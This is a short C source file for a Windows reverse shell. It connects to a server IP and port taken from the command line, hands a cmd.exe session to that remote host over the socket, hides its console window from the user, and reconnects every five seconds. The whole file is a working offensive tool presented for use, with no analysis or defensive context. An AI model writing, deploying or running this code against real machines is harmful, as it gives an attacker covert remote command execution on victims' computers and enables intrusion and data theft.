#include <winsock2.h> //windows socket communications over TCP/IP
#include <ws2tcpip.h> // windows socket communications over TCP/IP
#include <windows.h> //required for calling other processes, initiating other headers and calls
#include <stdio.h> // required for printf function
#pragma comment(lib, "ws2_32.lib") //inform compiler to statically compile library into executable
#define BUFLEN 1024

void	RunShell(char *serverIP, int port) {
	while (1) {
		SOCKET		sock;
		SOCKADDR_IN	sa;
		WSADATA		WSAData;

		Sleep(5000); //5 sec
		WSAStartup(MAKEWORD(2,2), &WSAData);
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr.s_addr = inet_addr(serverIP);
  
        if (WSAConnect(sock, (SOCKADDR*)&sa, sizeof(sa), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(sock);
            WSACleanup();
            continue;
        } else {
            char recvData[BUFLEN];
            memset(recvData, 0, sizeof(recvData));
            int recvCode = recv(sock, recvData, BUFLEN, 0);
            if (recvCode <= 0) {
                closesocket(sock);
                WSACleanup();
                continue;
            } else {
                char process[] = "cmd.exe";
                STARTUPINFO sInfo;
                PROCESS_INFORMATION pInfo;
                memset(&sInfo, 0, sizeof(sInfo));
                sInfo.cb = sizeof(sInfo);
                sInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE) sock;
                CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
                WaitForSingleObject(pInfo.hProcess, INFINITE);
                CloseHandle(pInfo.hProcess);
                CloseHandle(pInfo.hThread);
                memset(recvData, 0, sizeof(recvData));
                recvCode = recv(sock, recvData, BUFLEN, 0);
                if (recvCode <= 0) {
                    closesocket(sock);
                    WSACleanup();
                    continue;
                }
                if (strcmp(recvData, "exit\n") == 0)
                    exit(0);
            }
        }

        bind(sock, (SOCKADDR *)&sa, sizeof(sa));
		WSACleanup();
	}
}

int	main(int ac, char **av) {
	FreeConsole(); //function to disable window's console to be invisible by user
	if (ac == 3)
		RunShell(av[1], atoi(av[2]));
	else
	    printf("Usage:\n\t./reverse_shell ServerIP Port");
}
